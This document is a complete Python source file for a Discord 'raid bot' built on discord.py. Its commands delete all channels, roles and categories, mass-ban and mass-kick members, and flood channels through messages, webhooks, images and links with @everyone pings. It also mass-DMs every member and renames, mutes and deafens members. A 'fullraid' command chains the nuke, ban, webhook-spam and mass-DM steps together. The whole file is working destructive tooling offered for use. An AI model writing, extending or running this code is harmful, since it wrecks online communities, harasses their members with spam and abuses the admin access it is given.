# language: Python 3.11+, file: raidbot.py
import discord
from discord.ext import commands
import asyncio
import os
import random
import io

TOKEN = os.getenv("TOKEN")
PREFIX = "!"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"online as {bot.user} | {len(bot.guilds)} guilds")

# ─────────────────────────────────────────────
# Helper
# ─────────────────────────────────────────────

async def ask(ctx, question: str, timeout: float = 30.0):
    """Ask the invoker a question and return their reply content"""
    await ctx.send(question)
    try:
        msg = await bot.wait_for(
            "message",
            check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
            timeout=timeout
        )
        return msg.content.strip()
    except asyncio.TimeoutError:
        await ctx.send("timed out.")
        return None

# ─────────────────────────────────────────────
# Core destruction with speed + naming
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """deletes everything then recreates channels with custom name + speed"""
    await ctx.message.delete()

    name = await ask(ctx, "channel name to create after nuke? (default: raided)")
    if name is None: return
    if not name: name = "raided"

    speed = await ask(ctx, "speed in seconds between actions? (0.3 – 2.0 recommended, default 0.5)")
    if speed is None: return
    try:
        delay = float(speed) if speed else 0.5
    except:
        delay = 0.5

    amount = await ask(ctx, "how many channels to create after? (default 20)")
    if amount is None: return
    try:
        count = int(amount) if amount else 20
    except:
        count = 20

    status = await ctx.send(f"nuking… delay `{delay}s` | name `{name}` | count `{count}`")

    for ch in list(ctx.guild.channels):
        try:
            await ch.delete()
        except:
            pass
        await asyncio.sleep(delay)

    for r in list(ctx.guild.roles):
        if r.is_default() or r.managed:
            continue
        try:
            await r.delete()
        except:
            pass
        await asyncio.sleep(delay * 0.5)

    for i in range(count):
        try:
            ch = await ctx.guild.create_text_channel(f"{name}-{i}")
            await ch.send("@everyone")
        except:
            break
        await asyncio.sleep(delay)

    try:
        await status.edit(content="nuke finished.")
    except:
        pass

@bot.command()
@commands.has_permissions(ban_members=True)
async def banall(ctx):
    await ctx.message.delete()
    speed = await ask(ctx, "ban speed in seconds? (default 0.8)")
    if speed is None: return
    try:
        delay = float(speed) if speed else 0.8
    except:
        delay = 0.8

    status = await ctx.send(f"banning… `{delay}s` delay")
    banned = 0
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.author:
            continue
        try:
            await m.ban(reason="raided", delete_message_days=0)
            banned += 1
        except:
            pass
        await asyncio.sleep(delay)
    await status.edit(content=f"banall done — {banned} banned")

@bot.command()
@commands.has_permissions(kick_members=True)
async def kickall(ctx):
    await ctx.message.delete()
    speed = await ask(ctx, "kick speed in seconds? (default 0.6)")
    if speed is None: return
    try:
        delay = float(speed) if speed else 0.6
    except:
        delay = 0.6

    status = await ctx.send(f"kicking… `{delay}s` delay")
    kicked = 0
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.author:
            continue
        try:
            await m.kick(reason="raided")
            kicked += 1
        except:
            pass
        await asyncio.sleep(delay)
    await status.edit(content=f"kickall done — {kicked} kicked")

@bot.command()
@commands.has_permissions(ban_members=True)
async def massban(ctx):
    await banall(ctx)

@bot.command()
@commands.has_permissions(kick_members=True)
async def masskick(ctx):
    await kickall(ctx)

@bot.command()
@commands.has_permissions(manage_roles=True)
async def roledelete(ctx):
    await ctx.message.delete()
    for r in list(ctx.guild.roles):
        if r.is_default() or r.managed:
            continue
        try:
            await r.delete()
        except:
            pass
    await ctx.send("all roles deleted.", delete_after=5)

@bot.command()
@commands.has_permissions(manage_channels=True)
async def channeldelete(ctx):
    await ctx.message.delete()
    for ch in list(ctx.guild.channels):
        if isinstance(ch, discord.CategoryChannel):
            continue
        try:
            await ch.delete()
        except:
            pass
    await ctx.send("channels deleted.", delete_after=5)

@bot.command()
@commands.has_permissions(manage_channels=True)
async def categorydelete(ctx):
    await ctx.message.delete()
    for ch in list(ctx.guild.categories):
        try:
            await ch.delete()
        except:
            pass
    await ctx.send("categories deleted.", delete_after=5)

@bot.command()
@commands.has_permissions(manage_webhooks=True)
async def webhookspam(ctx):
    await ctx.message.delete()
    times = await ask(ctx, "how many messages per webhook? (default 8)")
    if times is None: return
    try:
        count = int(times) if times else 8
    except:
        count = 8

    msg = await ask(ctx, "message to spam? (default @everyone raided)")
    if msg is None: return
    if not msg:
        msg = "@everyone raided"

    status = await ctx.send("webhook spamming…")
    for ch in ctx.guild.text_channels:
        try:
            wh = await ch.create_webhook(name="raid")
            for _ in range(count):
                await wh.send(msg)
            await wh.delete()
        except:
            pass
    await status.edit(content="webhookspam finished.")

@bot.command()
@commands.has_permissions(administrator=True)
async def massdm(ctx):
    """DMs everyone. reports denied DMs only to you."""
    await ctx.message.delete()

    message = await ask(ctx, "message to mass DM?")
    if not message:
        return

    status = await ctx.send("sending DMs…")
    success = 0
    denied = 0

    for m in ctx.guild.members:
        if m.bot:
            continue
        try:
            await m.send(message)
            success += 1
        except discord.Forbidden:
            denied += 1
        except:
            denied += 1
        await asyncio.sleep(0.7)

    # only the invoker sees the deny report
    report = f"massdm finished\ndelivered: `{success}`\ndenied: `{denied}`"
    try:
        await ctx.author.send(report)
    except:
        await ctx.send(report, delete_after=15)

    try:
        await status.delete()
    except:
        pass

# ─────────────────────────────────────────────
# Server identity
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(manage_guild=True)
async def servername(ctx, *, name: str = None):
    await ctx.message.delete()
    if not name:
        name = await ask(ctx, "new server name?")
        if not name:
            return
    try:
        await ctx.guild.edit(name=name)
        await ctx.send(f"server renamed to **{name}**", delete_after=8)
    except:
        await ctx.send("failed to rename.", delete_after=5)

@bot.command()
@commands.has_permissions(manage_guild=True)
async def servericon(ctx):
    await ctx.message.delete()
    if not ctx.message.attachments:
        await ctx.send("attach an image with the command.")
        return
    data = await ctx.message.attachments[0].read()
    try:
        await ctx.guild.edit(icon=data)
        await ctx.send("server icon updated.", delete_after=8)
    except:
        await ctx.send("failed.", delete_after=5)

# ─────────────────────────────────────────────
# Spam / flood with custom content + speed
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    await ctx.message.delete()
    times = await ask(ctx, "how many messages? (default 20)")
    try:
        count = int(times) if times else 20
    except:
        count = 20

    msg = await ask(ctx, "message content? (default @everyone raided)")
    if msg is None:
        return
    if not msg:
        msg = "@everyone raided"

    speed = await ask(ctx, "delay between messages in seconds? (default 0.35)")
    try:
        delay = float(speed) if speed else 0.35
    except:
        delay = 0.35

    for _ in range(count):
        try:
            await ctx.send(msg)
        except:
            break
        await asyncio.sleep(delay)

@bot.command()
@commands.has_permissions(administrator=True)
async def spamall(ctx):
    await ctx.message.delete()
    times = await ask(ctx, "messages per channel? (default 8)")
    try:
        count = int(times) if times else 8
    except:
        count = 8

    msg = await ask(ctx, "message? (default @everyone raided)")
    if msg is None:
        return
    if not msg:
        msg = "@everyone raided"

    speed = await ask(ctx, "delay? (default 0.4)")
    try:
        delay = float(speed) if speed else 0.4
    except:
        delay = 0.4

    status = await ctx.send("spamming all channels…")
    for ch in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await ch.send(msg)
            except:
                break
            await asyncio.sleep(delay)
    await status.edit(content="spamall finished.")

@bot.command()
@commands.has_permissions(administrator=True)
async def channelspam(ctx):
    await ctx.message.delete()
    name = await ask(ctx, "channel name prefix? (default raid)")
    if name is None:
        return
    if not name:
        name = "raid"

    amount = await ask(ctx, "how many channels? (default 25)")
    try:
        count = int(amount) if amount else 25
    except:
        count = 25

    for i in range(count):
        try:
            ch = await ctx.guild.create_text_channel(f"{name}-{i}")
            await ch.send("@everyone")
        except:
            break
        await asyncio.sleep(0.4)

@bot.command()
@commands.has_permissions(administrator=True)
async def flood(ctx):
    """continuous flood with custom message + speed"""
    await spam(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def imageflood(ctx):
    """flood an image (attach one or give a direct link)"""
    await ctx.message.delete()

    times = await ask(ctx, "how many times? (default 10)")
    try:
        count = int(times) if times else 10
    except:
        count = 10

    url = None
    data = None

    if ctx.message.attachments:
        data = await ctx.message.attachments[0].read()
    else:
        url = await ask(ctx, "direct image URL? (or cancel)")
        if not url:
            return

    for _ in range(count):
        try:
            if data:
                await ctx.send(file=discord.File(io.BytesIO(data), "raid.png"))
            else:
                await ctx.send(url)
        except:
            break
        await asyncio.sleep(0.5)

@bot.command()
@commands.has_permissions(administrator=True)
async def linkflood(ctx):
    await ctx.message.delete()
    times = await ask(ctx, "how many? (default 15)")
    try:
        count = int(times) if times else 15
    except:
        count = 15

    link = await ask(ctx, "link to flood?")
    if not link:
        return

    for _ in range(count):
        try:
            await ctx.send(link)
        except:
            break
        await asyncio.sleep(0.35)

@bot.command()
@commands.has_permissions(administrator=True)
async def filespam(ctx):
    await imageflood(ctx)

# ─────────────────────────────────────────────
# Role / nick / voice
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(manage_roles=True)
async def massrole(ctx):
    await ctx.message.delete()
    name = await ask(ctx, "role name to create + assign? (default raided)")
    if name is None:
        return
    if not name:
        name = "raided"

    role = discord.utils.get(ctx.guild.roles, name=name)
    if not role:
        role = await ctx.guild.create_role(name=name, colour=discord.Colour.random())

    for m in ctx.guild.members:
        try:
            await m.add_roles(role)
        except:
            pass
        await asyncio.sleep(0.3)

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def nickall(ctx):
    await ctx.message.delete()
    nick = await ask(ctx, "nickname for everyone? (default raided)")
    if nick is None:
        return
    if not nick:
        nick = "raided"

    for m in ctx.guild.members:
        try:
            await m.edit(nick=nick)
        except:
            pass
        await asyncio.sleep(0.35)

@bot.command()
@commands.has_permissions(move_members=True)
async def voicekick(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try:
                await m.move_to(None)
            except:
                pass
    await ctx.send("everyone disconnected from voice.", delete_after=6)

@bot.command()
@commands.has_permissions(deafen_members=True)
async def deafenall(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try:
                await m.edit(deafen=True)
            except:
                pass

@bot.command()
@commands.has_permissions(mute_members=True)
async def muteall(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try:
                await m.edit(mute=True)
            except:
                pass

# ─────────────────────────────────────────────
# Full raid + utility
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def fullraid(ctx):
    """runs the heavy sequence with prompts"""
    await ctx.message.delete()
    await ctx.send("starting fullraid sequence…")
    await nuke(ctx)
    await banall(ctx)
    await webhookspam(ctx)
    await massdm(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def leave(ctx):
    await ctx.message.delete()
    await ctx.guild.leave()

# ─────────────────────────────────────────────
# !cmds – clean embed
# ─────────────────────────────────────────────

@bot.command()
async def cmds(ctx):
    embed = discord.Embed(
        title="Raid Bot Commands",
        description="All commands support speed / name / content prompts when needed.",
        color=0xE74C3C
    )
    embed.add_field(
        name="Destruction",
        value="`!nuke` `!banall` `!kickall` `!massban` `!masskick`\n`!roledelete` `!channeldelete` `!categorydelete`\n`!fullraid` `!leave`",
        inline=False
    )
    embed.add_field(
        name="Spam / Flood",
        value="`!spam` `!spamall` `!channelspam` `!flood`\n`!webhookspam` `!imageflood` `!linkflood` `!filespam`",
        inline=False
    )
    embed.add_field(
        name="Members",
        value="`!massdm` `!massrole` `!nickall`\n`!voicekick` `!deafenall` `!muteall`",
        inline=False
    )
    embed.add_field(
        name="Server",
        value="`!servername` `!servericon`",
        inline=False
    )
    embed.add_field(
        name="Utility",
        value="`!cmds`",
        inline=False
    )
    embed.set_footer(text="Most destructive commands will ask you for speed / name / content")
    await ctx.send(embed=embed)

bot.run(TOKEN)